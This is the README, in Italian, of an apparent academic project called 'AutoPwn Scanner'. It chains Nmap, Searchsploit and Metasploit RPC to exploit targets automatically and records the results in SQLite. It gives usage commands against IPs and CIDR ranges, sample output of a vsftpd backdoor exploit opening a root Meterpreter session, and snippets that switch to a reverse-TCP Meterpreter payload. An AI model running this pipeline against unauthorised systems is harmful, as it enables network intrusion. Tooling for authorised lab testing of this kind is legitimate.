# 🔍 AutoPwn Scanner

> Automated vulnerability scanning and exploitation pipeline for authorized lab environments.  
> **C++ runner · Python logic · Metasploit RPC · SQLite reporting**

![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.10%2B-blue)
![Platform](https://img.shields.io/badge/platform-Kali%20%7C%20Parrot-darkgreen)
![Status](https://img.shields.io/badge/status-academic%20project-orange)

---

> ⚠️ **DISCLAIMER — USO ETICO E LEGALE**  
> Questo strumento è stato sviluppato esclusivamente per ambienti di laboratorio accademico, CTF e reti per le quali si dispone di **autorizzazione scritta esplicita**.  
> L'uso su sistemi altrui senza consenso è illegale ai sensi del D.Lgs. 231/2001 (art. 615-ter c.p. e seguenti).  
> Gli autori declinano ogni responsabilità per usi impropri.

---

## Indice

- [Panoramica](#panoramica)
- [Architettura](#architettura)
- [Struttura del progetto](#struttura-del-progetto)
- [Prerequisiti](#prerequisiti)
- [Installazione](#installazione)
- [Configurazione](#configurazione)
- [Utilizzo](#utilizzo)
- [Database](#database)
- [Monitor sessioni](#monitor-sessioni)
- [Esempi di output](#esempi-di-output)
- [Estendere il tool](#estendere-il-tool)

---

## Panoramica

**AutoPwn Scanner** è una pipeline di sicurezza offensiva che integra tre tool standard del penetration testing in un unico flusso automatizzato:

| Fase | Tool | Compito |
|------|------|---------|
| 1 | **Nmap** | Scansione porte + rilevamento versioni servizi |
| 2 | **Searchsploit** | Ricerca exploit pubblici per i servizi trovati |
| 3 | **Metasploit RPC** | Caricamento moduli e tentativi di exploit automatici |

Ogni risultato viene persistito in un database **SQLite** locale e le sessioni Meterpreter vengono notificate in tempo reale tramite un monitor in background.

---

## Architettura

```
┌──────────────────────────────────────────────────────────────┐
│                   scanner_runner  (C++)                       │
│                                                              │
│   ┌──────────┐    ┌─────────────┐    ┌──────────────────┐   │
│   │   Nmap   │───▶│ scan_IP.xml │───▶│  Searchsploit    │   │
│   └──────────┘    └─────────────┘    └────────┬─────────┘   │
│                                               │ JSON         │
└───────────────────────────────────────────────┼─────────────┘
                                                │
                         ┌──────────────────────▼────────────┐
                         │         logic_mapper.py            │
                         │                                    │
                         │  ┌────────────┐ ┌──────────────┐  │
                         │  │ NmapParser │ │ SSFilter     │  │
                         │  └─────┬──────┘ └──────┬───────┘  │
                         │        └────────┬────────┘         │
                         │         ┌───────▼───────┐          │
                         │         │ MetasploitMgr │◀─msfrpcd │
                         │         └───────┬───────┘          │
                         │         ┌───────▼───────┐          │
                         │         │   SQLite DB   │          │
                         │         └───────────────┘          │
                         │                                    │
                         │  ┌─────────────────────────────┐  │
                         │  │ MeterpreterMonitor (thread) │  │
                         │  └─────────────────────────────┘  │
                         └────────────────────────────────────┘
```

---

## Struttura del progetto

```
autopwn-scanner/
├── scanner_runner.cpp        # Runner C++: lancia Nmap, Searchsploit e Python
├── logic_mapper.py           # Core Python: parsing, filtro MSF, RPC, monitor
├── db_report.py              # Report leggibile del database SQLite
├── start_msfrpcd.sh          # Helper per avviare il demone RPC di Metasploit
├── config.ini.example        # Template configurazione (config.ini è in .gitignore)
├── requirements.txt          # Dipendenze Python
├── results/                  # Creata a runtime (esclusa da git)
│   ├── scan_<IP>.xml
│   ├── searchsploit_results.json
│   └── scanner.db
└── README.md
```

---

## Prerequisiti

| Requisito | Versione minima | Note |
|-----------|----------------|------|
| OS | Kali Linux / Parrot OS | Consigliato; funziona su qualsiasi Debian-based |
| Python | 3.10+ | Per i type hints `list[dict]` |
| GCC/G++ | 9+ | Con supporto `-std=c++17` |
| Nmap | 7.80+ | Con script `vulners` incluso |
| Metasploit Framework | 6.x | `msfconsole`, `msfrpcd` |
| Searchsploit / ExploitDB | qualsiasi | `sudo apt install exploitdb` |

---

## Installazione

```bash
# 1. Clona il repository
git clone https://github.com/<tuo-username>/autopwn-scanner.git
cd autopwn-scanner

# 2. Installa le dipendenze Python
pip install -r requirements.txt

# 3. Compila il runner C++
g++ -o scanner_runner scanner_runner.cpp -std=c++17

# 4. Copia e personalizza la configurazione
cp config.ini.example config.ini
nano config.ini
```

---

## Configurazione

Tutte le impostazioni sensibili sono in `config.ini` (mai committato su Git):

```ini
[metasploit]
password = cambia_questa_password
host     = 127.0.0.1
port     = 55553

[scanner]
output_dir          = ./results
monitor_interval    = 5    # secondi tra un polling e l'altro
post_pipeline_wait  = 10   # secondi extra dopo la pipeline per sessioni lente

[database]
path = ./results/scanner.db
```

> Il file `config.ini.example` con valori placeholder è l'unico da committare.  
> **Non committare mai `config.ini` con la password reale.**

---

## Utilizzo

### Passo 1 — Avvia il demone RPC di Metasploit

```bash
# In un terminale separato
bash start_msfrpcd.sh

# Oppure manualmente
msfrpcd -P cambia_questa_password -n -f -a 127.0.0.1 -p 55553
```

### Passo 2 — Esegui la pipeline

```bash
# Target singolo (richiede sudo per i raw socket di Nmap)
sudo ./scanner_runner 192.168.1.10

# Range di rete CIDR
sudo ./scanner_runner 192.168.1.0/24
```

Il runner C++ esegue in sequenza:
1. `nmap -sV --script=vulners -oX results/scan_<IP>.xml <target>`
2. `searchsploit --nmap results/scan_<IP>.xml -j → results/searchsploit_results.json`
3. `python3 logic_mapper.py --xml ... --json ...`

### Passo 3 — Visualizza i risultati

```bash
python3 db_report.py

# Con path database custom
python3 db_report.py ./results/scanner.db
```

### Opzioni avanzate di `logic_mapper.py`

```
python3 logic_mapper.py --xml <file.xml> --json <file.json> [--monitor-interval SEC]

  --xml               Percorso file XML prodotto da Nmap
  --json              Percorso file JSON prodotto da Searchsploit
  --monitor-interval  Secondi tra polling del monitor sessioni (default: 5)
```

---

## Database

Il database SQLite in `results/scanner.db` contiene tre tabelle:

```sql
Targets
  id · ip · hostname · os_info · scan_time

Vulnerabilities
  id · target_id → Targets
  port · protocol · service · version
  exploit_name · exploit_path · has_msf · found_time

Exploits_Found
  id · vuln_id → Vulnerabilities
  msf_module · rhost · rport
  session_id · success · attempt_time
```

Query rapide di esempio:

```bash
# Tutti gli exploit riusciti
sqlite3 results/scanner.db \
  "SELECT rhost, msf_module, session_id FROM Exploits_Found WHERE success=1;"

# Vulnerabilità con modulo MSF disponibile
sqlite3 results/scanner.db \
  "SELECT t.ip, v.port, v.service, v.exploit_name
   FROM Vulnerabilities v JOIN Targets t ON v.target_id=t.id
   WHERE v.has_msf=1;"
```

---

## Monitor sessioni

Il `MeterpreterMonitor` gira come thread daemon durante tutta la pipeline.  
Quando rileva una nuova sessione aperta, stampa un banner colorato:

```
╔══════════════════════════════════════════════╗
║  ★  METERPRETER SESSION                      ║
╠══════════════════════════════════════════════╣
║  Session ID : 1                              ║
║  Target     : 192.168.1.50                   ║
║  Tipo       : meterpreter                    ║
║  Piattaforma: linux / x86_64                 ║
║  Utente     : root                           ║
║  Modulo     : exploits/unix/ftp/vsftpd_234   ║
║  Ora        : 14:32:07                       ║
╚══════════════════════════════════════════════╝
```

| Tipo sessione | Icona | Colore |
|---|---|---|
| `meterpreter` | ★ | Verde |
| `shell` | ✓ | Giallo |
| altro | ~ | Ciano |

La sessione viene automaticamente registrata nel database anche se non avviata direttamente dalla pipeline (es. exploit manuale parallelo).

---

## Esempi di output

```
==============================================
   Security Scanner Runner (C++) - Esame Lab
==============================================

[NMAP] Avvio scansione su: 192.168.1.50
[NMAP] Output XML -> ./results/scan_192.168.1.50.xml
[SEARCHSPLOIT] Analisi dell'XML...
[PYTHON-BRIDGE] Invocazione logic_mapper.py

══════════════════════════════════════════════
  LOGIC MAPPER – Avvio pipeline
══════════════════════════════════════════════

[MONITOR] Avviato. Polling ogni 5s.
[DB] Connesso a: ./results/scanner.db
[PARSER] Host trovati: 1
[MSF] Connesso a msfrpcd su 127.0.0.1:55553

[MAPPER] Host: 192.168.1.50 (metasploitable) OS: Linux 2.6.x
  ↳ Porta 21/tcp: ftp vsftpd 2.3.4
    → Tentativo MSF: exploits/unix/ftp/vsftpd_234_backdoor
[MSF] Lancio: exploits/unix/ftp/vsftpd_234_backdoor → 192.168.1.50:21

★  METERPRETER SESSION  [ID: 1 | 192.168.1.50]  ★

[MAPPER] Attendo 10s per sessioni ritardate...
[MONITOR] Arrestato.
[MAPPER] Pipeline completata. Dati salvati nel DB.
```

---

## Estendere il tool

**Flag Nmap personalizzati** — in `NmapRunner::run()` in `scanner_runner.cpp`:
```cpp
// Scansione completa tutte le porte con OS detection
"nmap -A -p- --script=vulners -oX " + output_xml + " " + target
```

**Payload Metasploit diverso** — in `MetasploitManager.run_exploit()`:
```python
# Da generico a Meterpreter stageless Windows x64
payload = self.client.modules.use("payload", "windows/x64/meterpreter_reverse_tcp")
```

**Notifiche esterne da MeterpreterMonitor** — estendi `_notify()`:
```python
import requests
requests.post("https://hooks.slack.com/...", json={"text": f"Sessione aperta su {rhost}!"})
```

**Export report in JSON**:
```python
# In db_report.py, sostituisci print() con json.dump() per output machine-readable
```
